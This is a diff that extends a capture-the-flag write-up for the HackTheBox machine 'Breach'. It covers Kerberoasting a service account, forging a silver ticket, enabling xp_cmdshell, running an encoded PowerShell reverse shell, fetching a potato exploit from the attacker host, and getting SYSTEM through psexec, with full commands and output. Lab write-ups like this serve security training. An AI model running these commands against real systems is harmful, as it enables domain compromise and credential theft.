@@ -1065,9 +1065,22 @@ We'll go to the `"Analysis"` tab to use the pre-made queries in Bloodhound. A ve
   </a>
 </p>
 
+<p align="center">
+  <a href="/assets/images/breach/Captura4.png" class="glightbox">
+    <img src="/assets/images/breach/Captura4.png" width="700">
+  </a>
+</p>
+
+
 This shows us svc_mssql has a SPN set, meaning it might be vulnerable to a kerberoast attack. To try and exploit this, we have a lot of options out there, using nxc or imapcket tools is always my go to.
 
-This time, I'll use impacket.
+### Kerberoasting
+
+An SPN or `Service Principal Name` is basically a label in Active Directory that links a service (like SQL or a web server) to the account running it. Kerberos uses this information to know which account should decrypt the service ticket during authentication.
+
+To perform a Kerberoast attack, we must first be authenticated in the domain, even as a low-privileged user. We then request a `service ticket` (TGS) for a given SPN. The Domain Controller returns a legitimate ticket that is encrypted using the service account’s key, which is derived from its password hash. Since any authenticated domain user is allowed to request service tickets, we can extract the encrypted portion and attempt to crack it offline. If the service account’s password is weak, this can result in recovering valid credentials for that account.
+
+For this, I'll use impacket-GetUserSPNs with the `-request` flag.
 
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/breach/bh]
@@ -1096,3 +1109,335 @@ Dictionary cache hit:
 $krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$0a0859eb586316d1878faa9e527e5320$1a3e60a909843cedcc0052dbafb380bbad1379e20af878a4a88c4ce6e1872b78f2b271153496f2458ebdf6494efcfb294cf01dcd5902c97a899c065634c0e3775472e4cacfa6aefe7b3b7aaaf569f78a55582a19d67ffc105385565131cdd157da44dc73e933fdbcbc483111dfa3cef67298292e2d9802b31fdc28b947cdfcf04e54b341391a9e07686fc21f98a2d59a4549025955e18e7d8b8ab67a8248f2beb6102c078921a93ca6b3f87195470dd98844555af9a2297de384a81e8121db5891328857008680797661e1b0847d7aa2b0e1d0dfca210510edf27a0ece640f60e6d0af0e71ca7d5630359bb2023a87f9e3c0a3f5bcec2b977029a7652e6acfa97c5e87da1b09890ce4030823247f7863eec5d44360a036abe7b2efd0e0bacbec627ca07aa2a016b7d523e8542d16f1178ae3cdf29e5a9050bfcaa6998b9df1a602ca364844cea68308e3c4422670d97ffbf4df8261b7c036d32100ba76a38691290229659ed861da73dd9b7348131b3315c012c0978ff9e9fb387ee063721848996ed1dd9f3ac7e42bdb7c963f73409525bbfecc0a83cfd3d929740bb9b60ad8eb020ecef8d2958f5aeaf10ccd19a6b0d76959283698e964f95671b5073ff8b206ba2e56b61a8da3d3ed1427b50bb0d8990d8856c7af02ea2d9cf5ef0702f159e005b722aec74eea05924268ab60db0083d25c0f28ace9b4f16665bca3b6fc8f79ccfec8d0a2c3b19ac3cd1946ffa9c791cdb007b53d9fdc886d8ac5538832773e81b74f74a1b7d3018e4e9cc3b96bdd29340edab20f5f3f61b15ed2ea103a28eb5fdc0122e0b53c512976c3f33d0f5021812a8b2c165674c9d58a72df2985ff37eb53b52394adfbf9604eeb33f29bf6b074dd5dd8ef2ab499fb1fb1ecb8e167eb8e121f4aada0bb61abd0f08a3c09ef626fc5c93020671afbf8c0391bc9de95d227e75ad3d68d8779ff8bb65c9ad47a3936d08f7e55ef6e426ec119d2f0a10fa46b6e074433d742d058305a0446585b5b0ea08e7d25a67be43dc97656511da1cd8dbdc2a86d334c8368debfa2102e75723121a3ce18530014f1ecbe720dd91bc561ab0cffcae09b676641d6e6ade9099b816639773be7b3b32fdeb4ee6581d14059fef1161ca9a8c389e0271ed274f16457a3cd813be10f700427e51a1433a84d406b1e7a782b8c3bf540586d6d05ee7a1075cc34ef18711b1fb53b2572ee0bcfd85104baad5bc1d7c39c0dab2eea4671ccd869629ddef179e1ca8cec6f2599275a70c3b7ecdcf449b8c2bfff56ac26507c97784bd65d94c6f39a8da8cd4e11aba95d344566ff1eb2f944eda8b082f74f7a62bc8a463d6c13adb69f7378495847d489b99abe8c39e967f98e7a3890426a72a8aa66ae018a971137d8383ee53469c07d614f02e4acf7b407ce50143a4c114a17207a29fb9aee14267c662e6442822e3d29873bfb98395551f46ee2d23267412057:Trustno1
 ```
 
+The hash easily cracks after some seconds and we now have achieved lateral movement.
+
+### Shell as svc_mssql
+
+With the new credentials, we'll check our permissions in bloodhound and marked it as owned.
+
+<p align="center">
+  <a href="/assets/images/breach/Captura5.png" class="glightbox">
+    <img src="/assets/images/breach/Captura5.png" width="700">
+  </a>
+</p>
+
+We don't have interesting `Outbuound permissions`, so I'll check port 1433 (mssql).
+
+I'll use `impacket-mssqlclient` for this with the flag `-windows-auth` to specify we're using a domain account.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ impacket-mssqlclient svc_mssql@breach.vl -windows-auth                            
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (BREACH\svc_mssql  guest@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
+    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
+    show_query                 - show query
+    mask_query                 - mask query    
+```
+
+We can connect succesfully but we are mapped as the guest account which doesn't have useful privileges. I'll enumerate with the premade commands in impacket.
+
+```bash
+SQL (BREACH\svc_mssql  guest@master)> enum_db
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+tempdb                   0   
+model                    0   
+msdb                     1   
+SQL (BREACH\svc_mssql  guest@master)> enum_links
+SRV_NAME              SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE        SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+-------------------   ----------------   -----------   -------------------   ------------------   ------------   -------   
+BREACHDC\SQLEXPRESS   SQLNCLI            SQL Server    BREACHDC\SQLEXPRESS   NULL                 NULL           NULL      
+Linked Server   Local Login   Is Self Mapping   Remote Login   
+-------------   -----------   ---------------   ------------   
+SQL (BREACH\svc_mssql  guest@master)> enum_logins
+name            type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+-------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa              SQL_LOGIN                 1          1               0             0            0              0           0           0           0   
+BUILTIN\Users   WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+SQL (BREACH\svc_mssql  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee   grantor   
+----------   --------   ---------------   ----------   -------   -------   
+SQL (BREACH\svc_mssql  guest@master)> enum_users
+UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
+------------------   --------   ---------   ---------   -------------   ----------   -----   
+dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
+guest                public     NULL        NULL        guest           b'2         '   b'00'   
+INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
+sys                  public     NULL        NULL        NULL            b'4         '    NULL   
+SQL (BREACH\svc_mssql  guest@master)> enu_owner
+ERROR(BREACHDC\SQLEXPRESS): Line 1: Could not find stored procedure 'enu_owner'.
+SQL (BREACH\svc_mssql  guest@master)> enum_owner
+Database   Owner   
+--------   -----   
+master     sa      
+tempdb     sa      
+model      sa      
+msdb       sa      
+```
+
+```bash
+SQL (BREACH\svc_mssql  guest@master)> xp_dirtree C:
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+$WinREAgent                     1      0   
+Boot                            1      0   
+Documents and Settings          1      0   
+EFI                             1      0   
+inetpub                         1      0   
+PerfLogs                        1      0   
+Program Files                   1      0   
+Program Files (x86)             1      0   
+ProgramData                     1      0   
+Recovery                        1      0   
+share                           1      0   
+System Volume Information       1      0   
+Users                           1      0   
+Windows                         1      0   
+````
+
+So far nothing that could give us a shell. I can read directories in the machine, but that is as far as we can go.
+
+### Silver Ticket attack
+
+A `TGS (Ticket Granting Service ticket)` is essentially a Kerberos ticket that you present to a specific service in order to access it. If we possess the NTLM hash (or plaintext password) of the service account running that service, we know the key used to encrypt and validate service tickets. This means we can forge our own TGS, potentially including a user with higher privileges. If the service does not revalidate the ticket with the Domain Controller, it will accept the forged ticket and grant the privileges defined inside it.
+
+Given into account that we now have the credentials of an account that owns a service and has a SPN set, we can perform a silver attack to try an elevate our privileges inside mssql.
+
+To perform this, we'll use `ticketer` from the impacket tools. I'll leave this [link](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/) too which explains different types of tickets and how to perform attacks with them.
+
+Following this [post](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver), we'll need the NTLM hash, domain SID and the SPN.
+
+We already gathered the SPN and the domain SID from our enumeration before, so we'll just need the `NTLM hash`. For this, we'll use the plaintext password we obtained before and compute the NTLM from there. We can simply use [this](https://www.browserling.com/tools/ntlm-hash) page.
+
+<p align="center">
+  <a href="/assets/images/breach/Captura6.png" class="glightbox">
+    <img src="/assets/images/breach/Captura6.png" width="700">
+  </a>
+</p>
+
+The command runs succesfully and we have now a ticket as Administrator.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl Administrator 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for breach.vl/Administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+
+We'll export the ticket and use again impacket-mssqclient to use it.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ export KRB5CCNAME=Administrator.ccache                    
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ impacket-mssqlclient -k -no-pass -windows-auth BREACHDC.breach.vl
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (BREACH\Administrator  dbo@master)> 
+```
+
+I can connect succesfully and as dbo, which means I have a lot more privileges than before. I'll try enabling xp_cmdshell now.
+
+```bash
+SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
+INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+Now I can run commands, I'll prompt for a base64 encoded reverse shell.
+
+```bash
+SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd...."
+```
+
+I receive a response on netcat and we have a shell as svc_mssql.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.129.9.183] 52666
+
+PS C:\Windows\system32> whoami
+breach\svc_mssql
+```
+
+### Shell as SYSTEM
+
+I didn't have to look very deep for a way to escalate my current privileges. `/whoami all` shows interesting privileges.
+
+```bash
+PS C:\Windows\system32> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID                                          
+================ =============================================
+breach\svc_mssql S-1-5-21-2330692793-3312915120-706255856-1115
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                                             Attributes                                        
+========================================== ================ =============================================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+NT SERVICE\MSSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    
+LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+With `SeImpersonatePrivilege` enabled, we can perform a Potato attack and gain shell as SYSTEM. I'll use SigmaPotato for this.
+
+I'll transfer it from my kali machine and run `"net user"` to change the password of the user I desire, in this case, Administrator.
+
+```bash
+PS C:\Users\svc_mssql> iwr -uri http://10.10.14.16/SigmaPotato.exe -o SigmaPotato.exe
+PS C:\Users\svc_mssql> .\SigmaPotato.exe "net user Administrator newpass00**"
+[+] Starting Pipe Server...
+[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+[+] Pipe Connected!
+[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
+[+] Searching for System Token...
+[+] PID: 928 | Token: 0x760 | User: NT AUTHORITY\SYSTEM
+[+] Found System Token: True
+[+] Duplicating Token...
+[+] New Token Handle: 1048
+[+] Current Command Length: 34 characters
+[+] Creating Process via 'CreateProcessAsUserW'
+[+] Process Started with PID: 1388
+
+[+] Process Output:
+The command completed successfully.
+```
+
+I'll check with nxc.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ nxc smb breach.vl -u Administrator -p 'newpass00**' 
+SMB         10.129.9.183    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.9.183    445    BREACHDC         [+] breach.vl\Administrator:newpass00** (Pwn3d!)
+```
+
+Nice, for the last step, I'll use psexec from impacket.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/breach]
+└─$ impacket-psexec Administrator:'newpass00**'@breach.vl                            
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on breach.vl.....
+[*] Found writable share ADMIN$
+[*] Uploading file ywEbvdQX.exe
+[*] Opening SVCManager on breach.vl.....
+[*] Creating service qPnD on breach.vl.....
+[*] Starting service qPnD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.558]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+We're succesfully SYSTEM, and here's the root flag.
+
+```bash
+PS C:\Users\Administrator\Desktop> ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         4/17/2025  12:37 AM             32 root.txt                                                             
+
+
+PS C:\Users\Administrator\Desktop> cat root.txt
+fc98f4....
+```
